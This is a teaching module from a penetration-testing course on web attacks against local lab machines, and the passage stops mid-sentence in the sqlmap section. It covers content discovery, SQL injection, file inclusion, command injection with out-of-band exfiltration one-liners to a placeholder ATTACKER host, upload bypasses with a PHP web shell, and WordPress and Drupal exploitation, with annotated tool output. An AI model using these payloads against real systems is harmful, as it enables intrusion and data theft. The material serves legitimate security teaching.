# 02 — Web Attacks

Web is where most of this path lives: **nine of the thirteen machines** are entered
through a browser-facing service. This module covers the six attack classes you
will actually use.

Full treatment: [`docs/CONCEPTS.md` §8](../docs/CONCEPTS.md#8-content-discovery--finding-hidden-urls)
(content discovery and HTTP status codes) and
[§13](../docs/CONCEPTS.md#13-web-application-attack-classes) (every web attack class).

---

## 1. Start with curl, not Burp

Before any tool, look at the site the way a client does:

```bash
curl -sI http://192.168.56.104/                  # headers only
curl -s  http://192.168.56.104/ | head -60       # first 60 lines of HTML
curl -s  http://192.168.56.104/robots.txt
curl -s  http://192.168.56.104/ | grep -iE 'comment|<!--|password|secret|flag'
```

`-s` silences the progress meter, `-I` requests only headers. This takes ten
seconds and routinely finds what an hour of tooling misses: a framework version, a
revealing `Server:` header, an HTML comment containing a username, a `robots.txt`
entry pointing straight at the flag.

**Headers worth reading:**

| Header | Tells you |
| --- | --- |
| `Server:` | Exact web server and version → `searchsploit` |
| `X-Powered-By:` | PHP/ASP version |
| `X-Generator:` | **The CMS and its version** — WordPress, Drupal, Koken |
| `Set-Cookie:` | Session scheme; `PHPSESSID` ⇒ PHP, `JSESSIONID` ⇒ Java, `wordpress_*` ⇒ WordPress, `laravel_session` ⇒ Laravel |
| `Location:` | Where a redirect goes — often reveals a hidden path |
| `WWW-Authenticate:` | Which auth scheme protects a `401` |
| `DAV:` | **WebDAV is enabled — the directory may be writable over HTTP** |

**Always read the page source too.** Authors hide usernames, base64 blobs and
hints in `<!-- comments -->` — Machines 2, 6 and 13 all start there.

---

## 2. Content discovery: what a wordlist attack actually is

**Content discovery** means guessing URL paths and keeping the ones that exist.
There is no cleverness — it is a dictionary attack against the URL space. A server
will serve anything it has, and does not advertise an index.

```bash
gobuster dir -u http://192.168.56.104/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,bak -t 40
dirb http://192.168.56.104/ /usr/share/wordlists/dirb/big.txt
ffuf -u http://192.168.56.104/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt
```

| Wordlist | Size | Use |
| --- | --- | --- |
| `dirb/common.txt` | 4,612 | Hand-curated; fast first pass |
| `dirb/big.txt` | 204,669 | Second pass; finds what `common` misses |
| `directory-list-2.3-medium.txt` | 220,547 | Crawled from real sites |
| **SecLists** | huge | The professional standard — `sudo apt install seclists` |

**Why wordlists work:** web directory names are not random. `/admin`,
`/phpmyadmin`, `/wp-content` appear on thousands of sites, so a curated list of a
few thousand words beats a random generator of millions.

### The status codes are the entire result

| Code | Meaning | What you do |
| --- | --- | --- |
| `200` | Exists and is readable | Read it |
| **`201`** | **Created** — a `PUT` succeeded | **You can write files here.** Look for WebDAV |
| `301` / `302` | Redirect | Usually a *directory* needing a trailing `/`; follow it |
| **`403`** | Forbidden | **It exists** but you may not read it — that is itself a disclosure. Try another path in, or another verb |
| `404` | Not found | The baseline. If *everything* 404s, your wordlist or extension list is wrong |
| `401` | Unauthenticated | See below |
| **`500`** | Server error | **Your input broke something.** Very often injection |

> **`401` vs `403` matters more than anything else here.** `401` means *"I don't
> know who you are"* — so authenticate. `403` means *"I know who you are and you
> may not"* — so authorisation is the problem, and no password will fix it.
> Confusing them wastes hours.

### The extension flag is the difference between nothing and everything

`/secret` returns 404. `/secret.txt` returns 200. **If a scan comes back empty,
change the extension list before you change the wordlist** — try
`php,txt,html,bak,old,zip,conf,log,inc`. Machine 1 and Machine 7 both hinge on
this.

Also always fetch these by hand before scanning:

```bash
curl -s http://target/robots.txt        # Machine 2 and 7 both hide things here
curl -s http://target/sitemap.xml
curl -s http://target/.htaccess
curl -sI http://target/                  # look for X-Generator
```

---

## 3. SQL injection

The application builds a query by concatenating your input:

```php
$q = "SELECT * FROM users WHERE user='".$_POST['u']."' AND pass='".$_POST['p']."'";
```

Supply `admin' -- ` and it becomes:

```sql
SELECT * FROM users WHERE user='admin' -- ' AND pass='whatever'
```

`-- ` starts a SQL comment (**the trailing space is required in MySQL**), so the
password check is deleted and you are logged in as an administrator with no
password. Your input escaped the *data* context and became *code*.

**Detect it** by inserting `'`, `"`, `` ` ``, `)` or `--` and watching for a
database error, a changed page length, or a different status code.

| Payload | What it does |
| --- | --- |
| `' OR 1=1 --` | Tautology |
| `' OR '1'='1` | String-context tautology |
| `\' OR 1=1 --` | **Backslash escape** — breaks out when the app escapes your quote. Machine 9 uses this |
| `1' UNION SELECT 1,2,3 --` | Find the column count, then extract data |
| `1' AND SLEEP(5) --` | **Time-based blind** — the only signal is how long the response takes |
| `1' AND SUBSTRING(user(),1,1)='r' --` | **Boolean blind** — the only signal is a different page |

```bash
sqlmap -u "http://target/page.php?id=1" --dbs
sqlmap -u "http://target/page.php?id=1" -D db -T users --dump
sqlmap -r request.txt --batch --level 3 --risk 2      # from a saved Burp request
```

> **`sqlmap` is a tool, not a substitute for understanding.** When it fails the
> reason is usually that you have not told it *where* the injectable parameter is,
> that authentication is needed (`--cookie=`), or that the injection is
> second-order. Confirm manually with a single `'` first — it takes ten seconds and
> tells you whether sqlmap has anything to work with.

**Practise it on Machine 9 (CengBox: 1)**, which has boolean-blind, time-blind and
UNION injection in one application, and again on Machine 10 (PwnLab).

---

## 4. Local File Inclusion

A script passes a user-controlled path to `include()` or a file-read function:

```php
<?php include($_GET['page']); ?>     // you control a filesystem path
```

```text
?page=/etc/passwd
?page=../../../../etc/passwd
?page=/var/log/apache2/access.log                 # log poisoning
?page=php://filter/convert.base64-encode/resource=index.php
```

**Memorise the `php://filter` wrapper.** It returns the file **base64-encoded
instead of executing it**, so you can read PHP *source code* — which is how you
recover `wp-config.php`, `configuration.php` and `.env`, i.e. the database
credentials. Machine 10 is built around this.

**LFI alone only reads.** To get code execution you must make the target *write* a
file you control somewhere predictable, then include it:

| Primitive | How | Machine |
| --- | --- | --- |
| **SMTP log poisoning** | Inject PHP through a `MAIL FROM`/`RCPT TO` string or a crafted `User-Agent`, then include `/var/log/apache2/access.log` or the mail spool | 12 |
| Session files | Include `/var/lib/php/sessions/sess_<your PHPSESSID>` | — |
| `/proc/self/environ` | Include the process environment | — |
| A writable share | Write via NFS/SMB, include via HTTP | — |

**RFI** (`?page=http://attacker/shell.txt`) is the remote version and requires
`allow_url_include=1` in `php.ini`, off by default since PHP 5.2. When it fails the
error usually says `http:// wrapper is disabled` — which tells you to switch to LFI
plus a local write.

---

## 5. Command injection

The application passes your input to a shell:

```php
system("ping -c 4 " . $_GET['host']);
```

Break out with a shell metacharacter:

| Payload | Effect |
| --- | --- |
| `; id` | Run sequentially, regardless of the first command's result |
| `\| id` | Pipe — run next |
| `\|\| id` | Run only if the first **failed** |
| `&& id` | Run only if the first **succeeded** |
| `` `id` `` / `$(id)` | Command substitution — preferred, nestable |
| `%0a id` | A URL-encoded **newline**; works when `;` and `\|` are filtered |

**When output comes back** you are done. **When it does not** ("blind"), exfiltrate
out-of-band — run a listener first and watch its log:

```bash
$(curl http://ATTACKER/$(whoami))      # data arrives in the URL of a request YOU receive
$(nslookup $(whoami).ATTACKER.com)     # data in DNS — survives most egress rules
; sleep 10                             # a pure timing oracle, needs no network at all
```

**If characters are stripped, find out exactly what survives.** Submit
`;|&$\`(){}[]<>` as one string and see which come back. Filters are usually a
`str_replace` of a short list and almost always miss something — commonly a
newline, or a doubled character (`;;` collapsing to `;` after one removal pass).
Machine 6 is the clean introduction; Machine 9 has a filter you bypass with
encoding.

---

## 6. File upload → web shell

The goal is a file **in a directory the web server executes**. Every defence has a
standard bypass:

| Defence | Bypass | Machine |
| --- | --- | --- |
| Extension blacklist (`.php` blocked) | `.phtml`, `.php5`, `.php7`, `.pht`, `.phar`, `.pHp` (case), `.ceng` (a custom executable extension), `.php.jpg`, `.php%00.jpg` | 9, 11 |
| MIME-type check (`Content-Type: image/jpeg`) | Change the header in Burp — **it is client-controlled and worthless** | 13 |
| `getimagesize()` / magic-byte check | Prepend real image bytes: `cat legit.gif shell.php > polyglot.php` | 10, 13 |
| Allow-list declared but never enforced | Read the source; upload anything | 13 |
| Randomised filename | Reverse-engineer the scheme — `md5($name . rand(1,100))` is 100 candidates | 13 |
| Uploads outside the docroot | Find the real path from an error message, or from the framework's conventions | — |

```bash
# A ready-made PHP reverse shell, and verifying you edited it before uploading:
cp /usr/share/webshells/php/php-reverse-shell.php shell.php
grep -nE '^\$(ip|port)' shell.php
```

**Always verify where the file landed.** If the app does not tell you, infer it
from framework conventions (`/wp-content/uploads/YYYY/MM/`, `images/`,
`storage/`) and confirm with a HEAD request before wiring up a listener.

> Machine 13 is the capstone for this class: the developer published the
> vulnerable source on GitHub, so you read the actual filter code and defeat it
> precisely rather than by trial and error. That is the professional version of
> this skill.

---

## 7. CMS-specific notes

### WordPress (Machines 4, 7, 12)

```bash
wpscan --url http://target/ -e u,vp,vt,cb --api-token <free token>
```

| `-e` value | Enumerates |
| --- | --- |
| `u` | **Users** — via `/wordpress/?author=1` → `301` → `/author/<username>/` |
| `vp` / `vt` | **Vulnerable** plugins / themes (the most common compromise vector) |
| `p` / `t` | All plugins / themes |
| `cb` | **Config backups** — `wp-config.php.bak`, `.wp-config.php.swp`. A jackpot |

WordPress's `wp-config.php` must contain the database credentials in plaintext,
because it needs them on every request. Any LFI anywhere on the site leaks them.
Also note the **Theme Editor and Plugin Editor**: an administrator can edit PHP
directly from the dashboard, so *WordPress admin access is remote code execution*.
Machines 7 and 12 both use this.

### Drupal (Machine 3)

`CHANGELOG.txt`, `MAINTAINERS.txt` and `UPGRADE.txt` are usually web-readable and
give the **exact version**. Drupalgeddon (CVE-2014-3704, Drupal 7.x < 7.32) is
pre-authentication SQL injection; Drupalgeddon2 (CVE-2018-7600) is pre-auth RCE.
Both have Metasploit modules. `?q=user/1`, `?q=user/2` enumerate accounts.

### Everything else (Machines 11, 13)

Identify the CMS from `X-Generator`, the login page's HTML, or a distinctive path
(`/admin.php`, `/api/`), then search its exact version on Exploit-DB. Koken
(Machine 11) validates uploads **client-side only**, so editing the request in
Burp defeats it entirely.

---

## 8. Exercises

Use a deliberately vulnerable local target — **never a real website**.
[OWASP Juice Shop](https://owasp.org/www-project-juice-shop/) and
[DVWA](https://github.com/digininja/DVWA) both run in Docker in one command.

1. **Content discovery.** Run `gobuster` against DVWA with `common.txt`, then with
   `-x php,txt,bak`. Record what the extension flag found that the first pass did not.
2. **Status codes.** Find one `403` and one `401` on the same target. Explain in
   your notes why they need different responses.
3. **SQL injection, manually.** Solve DVWA's SQLi at *low*, then at *medium* and
   *high*. Only then run `sqlmap` on *low* and compare what it did to what you did.
4. **LFI.** Use `php://filter/convert.base64-encode/resource=` to read the source of
   a PHP file on DVWA. Decode it and find a secret that the rendered page never shows.
5. **Command injection.** Solve DVWA's Command Injection at *low*, then find the
   blacklist it applies at *medium* and bypass it with a character the filter missed.
6. **Upload.** Put a PHP one-liner (`<?php system($_GET['c']); ?>`) into a valid GIF
   with `cat`, upload it somewhere that checks magic bytes, and execute it.

---

## 9. Check yourself

1. Which HTTP status code means "this path exists but you may not read it", and why
   is that itself a finding?
2. What is the difference between `401` and `403`, and what does each tell you to do next?
3. Why does `php://filter/convert.base64-encode/resource=index.php` return *source
   code* instead of executing the page?
4. Why does `' OR 1=1 --` need the trailing space after `--`?
5. A file upload accepts your `.php` but the server returns it as text instead of
   executing it. What are the two most likely explanations?
6. You found command injection but no output appears in the response. Name two ways
   to confirm it and exfiltrate data anyway.
7. Why is WordPress administrator access equivalent to remote code execution?

---

## 10. Annotated command reference — every input, every output

Each entry gives the command as you will actually type it, explains every token in the
**input**, shows **real terminal output**, and reads that output **line by line**.
`TARGET` = the victim VM, `ATTACKER` = your Kali on the lab interface.

---

### 10.1 `curl` — the HTTP conversation, made visible

```bash
curl -s -i -X POST 'http://TARGET/masteradmin/login.php' \
     -d 'username=admin&password=test' -c cookies.txt -D headers.txt
```

```text
HTTP/1.1 302 Found
Date: Sat, 11 May 2024 11:02:11 GMT
Server: Apache/2.4.29 (Ubuntu)
Set-Cookie: PHPSESSID=9f3k2j1h8g7f6e5d4c3b2a10; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Location: dashboard.php
Content-Length: 0
Content-Type: text/html; charset=UTF-8
```

**The input**

| Token | Meaning |
| --- | --- |
| `-s` | silent — no progress bar. Always use it when piping or reading output |
| `-i` | include the **response headers** in the output, before the body |
| `-X POST` | force the HTTP method. (`-d` alone implies POST, but being explicit is clearer) |
| `-d 'user=…&pass=…'` | the request **body**, URL-encoded form style. `-d` sets `Content-Type: application/x-www-form-urlencoded` automatically |
| `-c cookies.txt` | **save** cookies the server sets, to a file (a "cookie jar") |
| `-b cookies.txt` | **send** cookies from that jar on the next request — this is how you stay logged in |
| `-D headers.txt` | dump response headers to a file |
| `-o body.html` | write the body to a file instead of stdout |
| `-A 'Mozilla/5.0 …'` | set the `User-Agent`. Some apps block `curl/7.88` outright |
| `-k` | ignore TLS certificate errors — needed for self-signed HTTPS (Webmin, Usermin) |
| `-L` | follow redirects |
| `--data-urlencode 'c=bash -i'` | URL-encode one field for you (spaces, `&`, `>` become `%20`, `%26`, `%3E`) |

**Reading the output**

1. `HTTP/1.1 302 Found` — a **redirect**, not a success. On a login form this usually
   means *login worked* (you are being sent to the dashboard) — or it means "go back to
   the form". The `Location` header tells you which.
2. `Server: Apache/2.4.29 (Ubuntu)` — version disclosure. Feeds `searchsploit`.
3. **`Set-Cookie: PHPSESSID=…; path=/`** — the server created a session. Save it with
   `-c` and replay it with `-b`, or every subsequent request will be anonymous. Note
   there is **no `HttpOnly` and no `Secure` flag** — both are findings.
4. `Location: dashboard.php` — where to go next. A redirect to `login.php?error=1`
   means failure.
5. `Content-Length: 0` — the body is empty, which is normal for a 302. If you expected
   HTML, this explains why you saw none.

**The single most useful habit:** run every request twice — once to see the *status and
headers* (`-sI` or `-s -i`), once to see the *body* (`-s`). A browser merges them and
hides the evidence.

---

### 10.2 `dirb` — content discovery, and what a "hit" looks like

```bash
dirb http://TARGET/ /usr/share/dirb/wordlists/common.txt
```

```text
-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Sat May 11 11:14:02 2024
URL_BASE: http://192.168.56.104/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://192.168.56.104/ ----
+ http://192.168.56.104/cgi-bin/ (CODE:403|SIZE:299)
+ http://192.168.56.104/index.html (CODE:200|SIZE:10701)
+ http://192.168.56.104/robots.txt (CODE:200|SIZE:41)
==> DIRECTORY: http://192.168.56.104/secret/
+ http://192.168.56.104/server-status (CODE:403|SIZE:304)

---- Entering directory: http://192.168.56.104/secret/ ----
+ http://192.168.56.104/secret/index.php (CODE:301|SIZE:0)
+ http://192.168.56.104/secret/wp-login.php (CODE:200|SIZE:2489)

-----------------
END_TIME: Sat May 11 11:16:47 2024
DOWNLOADED: 9224 - FOUND: 6
```

**The input**

| Token | Meaning |
| --- | --- |
| `dirb` | a wordlist-driven URL brute-forcer: it requests each word as a path and classifies the response |
| `http://TARGET/` | the base URL. **Include the trailing `/`** — `dirb` concatenates, so `http://TARGET` + `admin` can produce a malformed URL |
| `/usr/share/dirb/wordlists/common.txt` | the wordlist — 4,612 common path names. Escalate to `big.txt` (204,669) when this finds nothing |
| `-X .php,.txt,.bak` | also try these **extensions** on every word. Critical on PHP apps: `index` is found, but `config.php` is only found with `-X .php` |
| `-R` | do **not** recurse into found directories |
| `-N 404` | treat status 404 as "not found" — needed when a site returns a soft-404 page with status 200 |
| `-S` | slow mode, one request at a time |
| `-a 'Mozilla/5.0'` | set a User-Agent |

**Reading the output**

1. `GENERATED WORDS: 4612` — the list size.
2. Each hit is `+ URL (CODE:nnn|SIZE:nnn)`. **Both numbers matter:**
   - **`CODE:200`** = the resource exists and was served. `robots.txt` at 200 with
     `SIZE:41` → go read those 41 bytes immediately.
   - **`CODE:403`** = exists but **forbidden**. `cgi-bin/` and `server-status` are real
     directories the server refuses to show. A 403 is *evidence the path exists* — do
     not treat it as a miss.
   - **`CODE:301`** = permanent redirect. Usually a directory being normalised to add a
     trailing slash, or HTTP→HTTPS. Follow it.
   - **`CODE:401`** = exists, needs authentication. A login area.
3. **`==> DIRECTORY:`** — dirb found a directory and is **recursing into it**. This is
   how `/secret/` was discovered and then scanned in turn.
4. **`SIZE` is the lie detector.** If every 404 on a site returns `SIZE:1234` (the same
   custom "not found" page) and one entry returns `SIZE:87`, that entry is different —
   investigate it. Conversely, a CMS that answers *everything* with 200 produces
   thousands of identical-size hits; that is a **soft-404** and you should switch to
   `-N` filtering or `ffuf`'s `-fs` size filter.
5. `DOWNLOADED: 9224 - FOUND: 6` — `9224 = 4612 words × 2` because dirb tried each
   word with and without a trailing slash (or because it recursed). `FOUND: 6` is the
   number of interesting responses.

**Scanning vs enumeration, restated:** `dirb` answering "does `/secret/` exist?" is
scanning. Reading what is *inside* `/secret/` — the `wp-login.php`, the version, the
usernames — is enumeration.

---

### 10.3 `gobuster` and `ffuf` — the faster generation

```bash
gobuster dir -u http://TARGET/ -w /usr/share/wordlists/dirb/big.txt \
  -x php,txt,bak -t 40 --no-error -o gobuster.txt
```

```text
===============================================================
Gobuster v3.6
===============================================================
[+] Url:                     http://192.168.56.104/
[+] Method:                  GET
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php, txt, bak
[+] Threads:                 40
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 10701]
/robots.txt           (Status: 200) [Size: 41]
/secret               (Status: 301) [Size: 321] [--> http://192.168.56.104/secret/]
/masteradmin          (Status: 301) [Size: 325] [--> http://192.168.56.104/masteradmin/]
/login.php            (Status: 200) [Size: 1523]
/upload.php           (Status: 302) [Size: 0] [--> login.php]
===============================================================
Finished
===============================================================
```

**The input**

| Token | Meaning |
| --- | --- |
| `gobuster dir` | the **mode**. Gobuster has subcommands: `dir` (paths), `dns`, `vhost`, `fuzz`. Forgetting `dir` is the classic error |
| `-u` | target URL |
| `-w` | wordlist |
| `-x php,txt,bak` | extensions, **comma-separated, no dots** (unlike dirb's `-X .php`) |
| `-t 40` | threads. 40 is fine locally; on a real server this is a denial-of-service |
| `--no-error` | suppress connection-error spam |
| `-o file` | save results |
| `-b 404,403` | treat these status codes as "not found" |
| `-k` | skip TLS verification |

```bash
ffuf -u http://TARGET/uploads/FUZZ -w candidates.txt -mc 200 -fs 0
```

```text
        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.56.104/uploads/FUZZ
 :: Wordlist         : FUZZ: /home/kali/candidates.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200
 :: Filter           : Response size: 0
________________________________________________

5f4dcc3b5aa765d61d8327deb882cf99.php [Status: 200, Size: 153, Words: 12, Lines: 6, Duration: 3ms]
:: Progress: [100/100] :: Job [1/1] :: 312 req/sec :: Duration: [0:00:01] :: Errors: 0 ::
```

**The `FUZZ` marker** is the heart of ffuf: it is replaced by each wordlist entry. It can
go anywhere — in the path, in a query parameter (`?id=FUZZ`), even in a header
(`-H 'Cookie: session=FUZZ'`). That makes ffuf a general-purpose fuzzer, not just a
directory brute-forcer.

| Token | Meaning |
| --- | --- |
| `-mc 200` | **match** only responses with status 200 |
| `-fs 0` | **filter** out responses whose size is 0 |
| `-fc 404` | filter by status code |
| `-fr 'regex'` | filter by a regex on the body — the answer to soft-404 pages |
| `-H 'Header: value'` | add a request header |
| `-ac` | **auto-calibrate**: ffuf works out the site's normal 404 shape and filters it automatically. Use this first when results look wrong |

**Reading ffuf's result line:**
`5f4dcc3b5aa765d61d8327deb882cf99.php [Status: 200, Size: 153, Words: 12, Lines: 6, Duration: 3ms]`
— the candidate that matched, its status, **body size in bytes**, **word count**, **line
count** and response time. Size/words/lines together let you spot an outlier instantly.
`:: Progress: [100/100] :: … 312 req/sec :: Errors: 0` is the summary — **`Errors: 0`
means every request got a response; a non-zero error count means the target was
dropping connections and your results are incomplete.**

Machine 13 is solved with exactly this command, against a wordlist of only 100
generated filenames.

---

### 10.4 `nikto` — a vulnerability scanner, not a dirbuster

```bash
nikto -h http://TARGET/ -o nikto.txt
```

```text
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.56.104
+ Target Hostname:    192.168.56.104
+ Target Port:        80
+ Start Time:         2024-05-11 11:31:04 (GMT3)
---------------------------------------------------------------------------
+ Server: Apache/2.4.29 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type.
+ Apache/2.4.29 appears to be outdated (current is at least 2.4.58).
+ /config.php: PHP Config file may contain database credentials.
+ /icons/README: Apache default file found. See: https://www.cisa.gov/known-exploited-vulnerabilities-catalog
+ 8073 requests: 0 error(s) and 5 item(s) reported on remote host
+ End Time:           2024-05-11 11:33:51 (GMT3) (167 seconds)
```

**Reading it**

1. Nikto's value is the **opinionated findings**, each with a documentation link. It
   checks ~7,000 known-bad paths, dangerous files, missing security headers and
   outdated server versions.
2. `/config.php: PHP Config file may contain database credentials.` — **this is the one
   line worth acting on.** It is a hypothesis, not a confirmation: go `curl` it and see.
3. `8073 requests: 0 error(s) and 5 item(s)` — request count (how thorough the run was)
   and error count (0 = the server never refused, so the results are trustworthy).
4. `167 seconds` — nikto is slow because it is thorough. It is **not** a substitute for
   `dirb`/`gobuster`; it is a complement. Run both.

---

### 10.5 `wpscan` — WordPress enumeration

```bash
wpscan --url http://vtcsec/secret/ -e u,ap --plugins-detection aggressive
wpscan --url http://dc-2/ -U admin,tom,jerry -P cewl-list.txt
```

```text
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.25
_______________________________________________________________

[+] URL: http://vtcsec/secret/ [192.168.56.104]
[+] Started: Sat May 11 11:40:02 2024

[+] WordPress version 4.9.1 identified (Insecure, released on 2017-11-29).
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By: Emoji Settings (Passive Detection)

[i] User(s) Identified:

[+] admin
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)

[+] marlinspike
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)

[SUCCESS] - admin / admin
```

**The input**

| Token | Meaning |
| --- | --- |
| `--url` | the WordPress base URL. Must include any subdirectory (`/secret/`) |
| `-e u` | enumerate **u**sers |
| `-e ap` | enumerate **a**ll **p**lugins (also `at` = themes, `tt` = timthumbs, `cb` = config backups, `db` = database exports, `dbe` = backups + all of the above) |
| `-e u,ap` | comma-separated combination |
| `--plugins-detection aggressive` | three modes: `passive` (only what the page shows), `mixed` (passive + known readme files), **`aggressive`** (actively probes every plugin in its database). Aggressive is slower and noisier but finds plugins that hide |
| `-U admin,tom,jerry` | usernames to attack (a file with `-U users.txt`) |
| `-P list.txt` | password list |
| `--password-attack xmlrpc` | attack via `xmlrpc.php`, which allows **many** password attempts per request — far faster, and a finding in itself |
| `--api-token T` | use the WPScan vulnerability database for CVE matching |
| `--rua` | randomise the User-Agent |

**Reading the output**

1. `[+] WordPress version 4.9.1 identified (Insecure, released on 2017-11-29).` —
   wpscan dates the release and flags **Insecure** when it knows later vulnerabilities.
   `4.9.1` from 2017 has ~19 known CVEs.
2. **`Found By:` / `Confirmed By:`** — wpscan tells you *how* it knows. `Rss Generator
   (Passive Detection)` means it read the `<generator>` tag in the RSS feed;
   `Emoji Settings (Passive Detection)` cross-checked a second indicator. **Two
   independent detections agreeing is why you can trust the version.** This is good
   practice to copy: never report a version from one weak signal.
3. `[i] User(s) Identified:` then each user with its own `Found By:`. **`Author Id
   Brute Forcing - Author Pattern`** means it requested `/?author=1`, `/?author=2`, …
   and read the redirect or the author archive page. That is the enumeration oracle —
   and the reason a defender should block `/?author=`.
4. **`[SUCCESS] - admin / admin`** — a working credential pair. Everything after this
   is CMS administration, which on WordPress means **code execution** (plugin upload or
   theme editor).
5. `[!]` marks warnings and `[-]` marks failures. A long list of `[-]` during a password
   attack is normal — it is the record of every wrong guess.

---

### 10.6 `sqlmap` — the stages, and what each stage proves

```bash
sqlmap -u "http://TARGET/masteradmin/login.php" --forms --batch --level 3 --risk 2
```

```text
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.8.2#stable}
|_ -| . [,]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal.
[*] starting @ 11:52:07 /2024-05-11/

[11:52:07] [INFO] provided value for parameter 'username' is empty. sqlmap will use a random value
[11:52:07] [INFO] testing connection to the target URL
[11:52:08] [INFO] searching for forms
[11:52:08] [INFO] fetching page: http://192.168.56.104/masteradmin/login.php
[11:52:08] [INFO] found 1 form: POST 'login.php'
[11:52:08] [INFO] heuristics detected web page charset 'ascii'
[11:52:08] [INFO] testing if the target URL content is stable
[11:52:09] [INFO] target URL content is stable
[11:52:09] [INFO] testing if POST parameter 'username' is dynamic
[11:52:09] [INFO] POST parameter 'username' appears to be dynamic
[11:52:09] [WARNING] heuristic (basic) test shows that POST parameter 'username' might not be injectable
[11:52:09] [INFO] testing for SQL injection on POST parameter 'username'
[11:52:09] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[11:52:14] [INFO] POST parameter 'username' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable
[11:52:14] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[11:52:22] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[11:52:32] [INFO] POST parameter 'username' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
[11:52:32] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[11:52:41] [INFO] target URL appears to have 5 columns
[11:52:49] [INFO] POST parameter 'username' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 214 HTTP(s) requests:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: username=admin' AND 1234=1234-- -&password=test

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=admin' AND (SELECT 1234 FROM (SELECT(SLEEP(5)))abc)-- -&password=test

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: username=admin' UNION ALL SELECT NULL,NULL,CONCAT(0x71,0x6b,0x7a,0x71,0x71,0x4d,0x55),NULL,NULL-- -&password=test
---
```

**The input**

| Token | Meaning |
| --- | --- |
| `-u "URL"` | the target URL, **quoted** — the shell would otherwise eat `&` and `?` |
| `--forms` | fetch the page, **find the forms**, and test their fields. Saves you hand-crafting the POST |
| `--batch` | never prompt; accept the default answer to every question. Essential for unattended runs |
| `--level 3` | 1–5. Higher levels test **cookies and User-Agent** as injection points and try more payloads |
| `--risk 2` | 1–3. Higher risk allows payloads that may **modify data** (time-based, `OR` conditions). `--risk 3` can include `OR`-based tests that may alter rows — dangerous on a real database |
| `-p username` | test **only** this parameter |
| `--data 'username=a&password=b'` | supply the POST body yourself instead of `--forms` |
| `--cookie 'PHPSESSID=…'` | stay authenticated |
| `--dbs` | list databases |
| `-D cengbox --tables` | list tables in that database |
| `-D cengbox -T admin --dump` | dump that table's contents |
| `--dump-all` | dump everything (slow, loud) |
| `--os-shell` | attempt an interactive OS shell via `INTO OUTFILE` — needs `FILE` privilege and a writable web root |
| `--random-agent` | vary the User-Agent |
| `--threads 1` | stay quiet |
| `--flush-session` | discard cached results and start fresh |

**Reading the output — this is a narrative, read it in order**

1. The **legal disclaimer** at the top is real: sqlmap refuses to run without it being
   displayed. On an unauthorised target, running it is a crime.
2. `testing connection to the target URL` then `searching for forms` then
   `found 1 form: POST 'login.php'` — `--forms` doing its job. If it says
   `no forms found`, the page has none and you must use `--data`.
3. `heuristics detected web page charset 'ascii'` and `target URL content is stable` —
   **stability matters.** For blind injection sqlmap compares page A to page B; if the
   page changes on every request (a random banner, a clock), results are meaningless and
   sqlmap will say `target URL content is not stable`.
4. `POST parameter 'username' appears to be dynamic` — changing the value changed the
   response, so the parameter is *used*. A non-dynamic parameter cannot be injectable.
5. `testing 'AND boolean-based blind …'` then `appears to be … injectable` — one line per
   technique tried. Each technique is a hypothesis sqlmap tests and then confirms.
6. **The three techniques it found, and what each means:**
   - **`boolean-based blind`** — `admin' AND 1234=1234-- -`. The page looks *different*
     when the injected condition is true versus false, so the attacker extracts data one
     **bit** at a time by asking yes/no questions. Slow, but reliable.
   - **`time-based blind`** — `… (SELECT(SLEEP(5)))…`. The page looks *identical*, so the
